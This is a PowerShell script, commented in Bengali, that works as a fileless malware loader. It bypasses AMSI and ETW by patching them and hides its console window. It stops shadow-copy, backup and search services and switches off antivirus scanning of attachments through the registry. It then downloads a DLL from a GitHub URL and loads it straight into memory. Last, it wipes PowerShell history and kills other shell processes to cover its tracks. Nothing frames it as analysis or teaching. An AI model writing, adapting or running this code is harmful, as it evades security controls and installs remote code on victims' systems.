# ============================================================
#  ★★★ AMSI + ETW বাইপাস (সর্বপ্রথম) ★★★
# ============================================================
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
    $scanBuffer = $a.GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    if ($scanBuffer) {
        $ptr = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($scanBuffer)
        [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x31C0C3)
    }
} catch {}

try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Etw {
        [DllImport("ntdll.dll")] static extern int RtlSetProcessTraceFlags(IntPtr ProcessHandle, int Flags);
        public static void Off() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            RtlSetProcessTraceFlags(p, 0);
        }
    }
"@ -IgnoreWarnings
    [Etw]::Off()
} catch {}

# ============================================================
#  ★★★ কনসোল উইন্ডো হাইড ★★★
# ============================================================
Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

# ============================================================
#  ★★★ মূল main.ps1-এর সব কাজ (যেমন ছিল) ★★★
# ============================================================
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ============================================================
#  ★★★ (পরিবর্তিত অংশ) ডিস্কে না লিখে সরাসরি মেমরিতে DLL ইনজেকশন ★★★
#  ─── কোনো ফাইল সংরক্ষণ হয় না, ১ সেকেন্ডের জন্যও না ───
# ============================================================
try {
    $url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
    # স্ট্যান্ডার্ড .NET অ্যাসেম্বলি লোড (ম্যানুয়াল ম্যাপিং নয়)
    [System.Reflection.Assembly]::Load($bytes) | Out-Null
} catch {
    # ব্যর্থ হলে নীরব থাকুন (কোনো এরর দেখাবে না)
}

# ============================================================
#  ★★★ ট্রেস ক্লিয়ার (পূর্বের মতো) ★★★
# ============================================================
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}

Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}

# Exit-এর জায়গায় এটি বসান
while ($true) { Start-Sleep -Seconds 86400 }
